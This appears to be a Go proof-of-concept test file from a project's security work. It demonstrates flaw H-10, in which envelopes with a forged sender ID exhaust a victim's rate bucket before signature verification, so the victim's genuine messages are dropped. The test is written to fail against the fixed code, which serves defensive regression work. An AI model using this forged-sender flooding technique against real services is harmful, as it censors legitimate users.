// Copyright (c) 2026 Hemi Labs, Inc.
// Use of this source code is governed by the MIT License,
// which can be found in the LICENSE file.

//go:build h10demo

// This file is a runnable proof-of-concept for H-10 (the envelope rate gate
// counting on the unverified ep.Sender before Verify). It is build-tagged
// `h10demo` so it does not run in normal `go test` / CI: it is an exploit
// demonstration, not a regression assertion. The regression assertions live in
// envelope_gate_censorship_test.go.
//
// Run the PoC with:
//
//	go test ./service/continuum/ -tags h10demo -run TestH10Demo -v
//
//   - Against the unpatched gate it passes: an attacker censors a victim's genuine
//     traffic using only signature-invalid forgeries.
//   - Against the fix it fails at step 3: the forgeries never touch the victim's
//     bucket, so the victim is still served. That failure is the signal that
//     forged-sender censorship is closed (cross-recipient replay is covered by the
//     invariant suite).

package continuum

import "testing"

// TestH10Demo_ForgedSenderCensorship demonstrates forged-sender censorship.
//
// The attacker never needs the victim's key. It takes envelopes it signed with
// its own key, re-stamps ep.Sender = victimID, and floods them at the target.
// Each one fails Verify and is discarded, but the buggy gate increments the
// victim's rate bucket before Verify, so the discarded forgeries still exhaust
// the victim's budget and the victim's next genuine envelope is dropped.
func TestH10Demo_ForgedSenderCensorship(t *testing.T) {
	target, targetPub := newEnvelopeGateServer(t)

	victim, err := NewSecret()
	if err != nil {
		t.Fatalf("victim secret: %v", err)
	}
	attacker, err := NewSecret()
	if err != nil {
		t.Fatalf("attacker secret: %v", err)
	}

	t.Logf("step 1 (baseline): a genuine envelope from the victim is accepted.")
	if got, _ := target.decryptPayload(genuineEnvelope(t, victim, targetPub)); got == nil {
		t.Fatalf("baseline failed: the victim's own genuine envelope was not accepted")
	}
	t.Logf("  -> victim served.")

	n := envelopeRateLimit + 50
	t.Logf("step 2 (attack): attacker floods %d forged envelopes with ep.Sender=victim.", n)
	forgedAccepted := 0
	for i := 0; i < n; i++ {
		if got, _ := target.decryptPayload(forgedEnvelope(t, attacker, targetPub, victim.Identity)); got != nil {
			forgedAccepted++
		}
	}
	// The forgeries are signature-invalid; a correct gate rejects every one of
	// them and never counts them. If any were accepted the test setup is wrong.
	if forgedAccepted != 0 {
		t.Fatalf("setup error: %d forged envelopes were accepted; the exploit relies on them "+
			"being rejected by Verify yet still counted by the pre-Verify gate", forgedAccepted)
	}
	t.Logf("  -> all %d forgeries rejected, none accepted (by Verify, or dropped by the "+
		"pre-Verify gate once the bucket is full on the buggy code).", n)

	t.Logf("step 3 (impact): the victim sends another genuine envelope.")
	got, err := target.decryptPayload(genuineEnvelope(t, victim, targetPub))
	if got != nil {
		t.Fatalf("not exploitable here: the victim is still served after the forged flood, " +
			"which is the correct behavior of the fix. This PoC therefore fails against the " +
			"fixed gate -- the intended signal that forged-sender censorship is closed. (The " +
			"invariant suite additionally covers cross-recipient replay.)")
	}
	t.Logf("  -> censored: the victim's genuine envelope was dropped (%v).", err)
	t.Logf("H-10 demonstrated: %d signature-invalid forgeries exhausted the victim's pre-Verify "+
		"rate bucket, so the victim's own valid traffic is now dropped before it is ever verified. "+
		"The bucket refreshes on a ~%s TTL, so the attacker can sustain the censorship indefinitely.",
		n, envelopeRateTTL)
}
